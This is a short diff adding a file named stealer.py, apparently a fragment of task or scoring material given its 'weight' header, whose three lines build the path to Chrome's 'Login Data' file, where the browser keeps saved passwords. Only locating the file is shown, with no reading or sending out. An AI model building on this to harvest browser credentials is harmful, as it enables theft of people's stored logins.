@@ -1,0 +1,7 @@
+# path: stealer.py
+# lines: 3
+# weight: 40
+# ---
+import os
+base = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data")
+db = os.path.join(base, "Default", "Login Data")
